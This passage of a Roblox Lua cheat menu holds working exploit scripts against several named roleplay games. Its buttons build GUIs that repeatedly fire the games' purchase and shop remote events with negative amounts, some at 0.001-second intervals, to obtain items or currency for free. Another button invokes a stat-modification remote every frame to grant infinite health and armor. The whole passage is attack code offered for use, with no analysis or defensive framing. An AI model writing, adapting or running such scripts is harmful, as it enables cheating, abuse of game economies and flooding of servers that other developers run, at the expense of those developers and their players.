toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO SKIN W SOUND (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY SKIN"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"sophia", "daniel", "cuervo", "anghelgirls", "coach", "berto", "jeric", "killua", "alaspogi", "xynu", "chris", "astig", "sup", "licht", "devil", "UZI"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("VENERAL CITY RP (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY SKIN"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silencer Magma", "el", "SAY", "Dragonic Silencer", "Dragonic M4", "4Qs", "Aztecas Familia", "Benten", "Flamethrower", "Grenade", "marysing", "Flashbang", "Handcuffs", "Pipe Bomb", "Smoke Grenade"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("URBAN DECAY RP (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 315, 0, 360) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Ammo Box", "Deagle", "Glock 18L", "Kalashnikov", "Kriss Vector", "M4A1", "MP5K", "Model 25", "P90", "USP 45 [S]", "UZI"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.Storage.RandomStuff.ShopSystem:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO LIST (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "BAGONG BARYO"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Roboto
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Crowbar", "Drill", "Oxy", "MCX", "AK-47", "MEDKIT", "Milk", "Tubigs"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["ROLEPLAY MENU 3"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("INFINITE STATS DOMINION (MONSY)", function()
	local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Main Frame (ALL BLACK)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 180)
frame.Position = UDim2.new(0.5, -120, 0.5, -90)
frame.BackgroundColor3 = Color3.new(0, 0, 0) -- PURE BLACK
frame.BorderSizePixel = 0
frame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 16)
corner.Parent = frame

-- Title (WHITE TEXT)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 36)
title.Position = UDim2.new(0, 0, 0, 6)
title.BackgroundTransparency = 1
title.Text = "INFINITE STATS"
title.TextColor3 = Color3.new(0,0,0) -- WHITE
title.Font = Enum.Font.Roboto
title.TextSize = 20
title.Parent = frame

-- Toggle Function
local function createToggle(name, posY, statName)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 90, 0, 24)
    label.Position = UDim2.new(0, 16, 0, posY)
    label.BackgroundTransparency = 1
    label.Text = name
    label.TextColor3 = Color3.new(0,0,0) -- WHITE
    label.Font = Enum.Font.Roboto
    label.TextSize = 15
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = frame

    local toggleFrame = Instance.new("Frame")
    toggleFrame.Size = UDim2.new(0, 56, 0, 28)
    toggleFrame.Position = UDim2.new(0, 168, 0, posY - 2)
    toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1) -- DARK GRAY (OFF)
    toggleFrame.Parent = frame

    local toggleCorner = Instance.new("UICorner")
    toggleCorner.CornerRadius = UDim.new(0, 14)
    toggleCorner.Parent = toggleFrame

    local toggleButton = Instance.new("Frame")
    toggleButton.Size = UDim2.new(0, 24, 0, 24)
    toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
    toggleButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3) -- GRAY (OFF)
    toggleButton.Parent = toggleFrame

    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 12)
    btnCorner.Parent = toggleButton

    local enabled = false
    local connection

    toggleFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            enabled = not enabled

            if enabled then
                toggleButton.Position = UDim2.new(1, -28, 0.5, -12)
                toggleButton.BackgroundColor3 = Color3.new(0, 0.8, 0) -- GREEN (ON)
                toggleFrame.BackgroundColor3 = Color3.new(0, 0.2, 0) -- DARK GREEN
                label.TextColor3 = Color3.new(0, 1, 0) -- GREEN TEXT
            else
                toggleButton.Position = UDim2.new(0, 4, 0.5, -12)
                toggleButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
                toggleFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
                label.TextColor3 = Color3.new(0,0,0) -- WHITE TEXT
            end

            if enabled then
                connection = RunService.Heartbeat:Connect(function()
                    if not enabled then return end
                    local args = { statName, Instance.new("Tool", nil) }
                    pcall(function()
                        game:GetService("ReplicatedStorage")
                            :WaitForChild("Aaron")
                            :WaitForChild("Remotes")
                            :WaitForChild("ModifyStatEvent")
                            :InvokeServer(unpack(args))
                    end)
                end)
            else
                if connection then connection:Disconnect() end
            end
        end
    end)
end

-- Create Toggles
createToggle("INFINITE HEALTH", 56, "Health")
createToggle("INFINITE ARMOR", 100, "Armor")

-- DRAGGABLE
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

RunService.RenderStepped:Connect(function()
    if dragging and dragInput then
        local delta = dragInput.Position - dragStart
        frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end)

-- Close Button (BLACK BG, WHITE X)
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 28, 0, 28)
close.Position = UDim2.new(1, -36, 0, 8)
close.BackgroundColor3 = Color3.new(0, 0, 0) -- BLACK
close.BorderSizePixel = 1
close.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
close.Text = "X"
close.TextColor3 = Color3.new(0,0,0) -- WHITE
close.Font = Enum.Font.Roboto
close.TextSize = 18
close.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = close

close.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)
end)

--// 8 Buttons in Main Menu
